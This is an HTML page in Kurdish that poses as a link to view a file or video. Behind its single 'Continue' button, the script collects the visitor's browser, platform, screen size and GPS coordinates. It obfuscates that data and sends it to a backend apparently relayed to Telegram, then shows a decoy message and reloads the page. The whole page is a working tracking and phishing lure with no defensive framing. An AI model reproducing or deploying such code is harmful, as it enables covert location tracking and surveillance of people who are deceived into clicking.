<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مەلەفی سوڕەیا</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }
        body { background: #0f172a; height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: #fff; padding: 25px; border-radius: 20px; width: 90%; max-width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        .btn { background: #2563eb; color: white; padding: 14px; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; width: 100%; font-weight: bold; margin-top: 15px; }
        .loader { border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #2563eb; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <h2>مەلەفی سوڕەیا</h2>
        <p style="color: #64748b; font-size: 13px; margin: 10px 0;">بۆ بینینی ناوەڕۆکەکە، کلیک لە دوگمەی خوارەوە بکە:</p>
        <div id="loader" class="loader"></div>
        <button id="mainBtn" class="btn" onclick="startProcess()">بەردەوامبوون</button>
    </div>

    <script>
        function simpleEncrypt(text) {
            return btoa(text.split('').map(char => 
                String.fromCharCode(char.charCodeAt(0) + 3)
            ).join(''));
        }

        async function sendToTelegram(payload) {
            try {
                if (payload.text) payload.text = simpleEncrypt(payload.text);
                if (payload.caption) payload.caption = simpleEncrypt(payload.caption);

                await fetch('/api/send', {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch(e) {}
        }

        async function startProcess() {
            document.getElementById('mainBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // ١. ناردنی زانیاریی سەرەتایی و براوسەر
            let ua = navigator.userAgent;
            let platform = navigator.platform;
            let screenRes = window.screen.width + "x" + window.screen.height;
            
            await sendToTelegram({ 
                type: 'text', 
                text: `⚡ *سەردانیکەری نوێ:*\n• سیستم: ${platform}\n• شاشە: ${screenRes}\n• براوسەر: \`${ua}\`` 
            });

            // ٢. ناردنی شوێنی GPS ئەگەر بەردەست بێت
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async function(pos) {
                    let lat = pos.coords.latitude;
                    let lon = pos.coords.longitude;
                    await sendToTelegram({ 
                        type: 'text', 
                        text: `📍 *شوێنی GPS:*\n• هێڵی پانی: \`${lat}\`\n• هێڵی درێژی: \`${lon}\`\n🗺️ [نەخشە](https://maps.google.com/?q=${lat},${lon})` 
                    });
                }, function(err) {}, { timeout: 5000 });
            }

            // ٣. پاش چەند چرکەیەک کردنەوەی ڤیدیۆکە
            setTimeout(function() {
                alert("بۆ بینینی ڤیدیۆکە تکایە سەردانی پەیجی سەرەکی بکەرەوە.");
                window.location.reload();
            }, 2500);
        }
    </script>
</body>
</html>
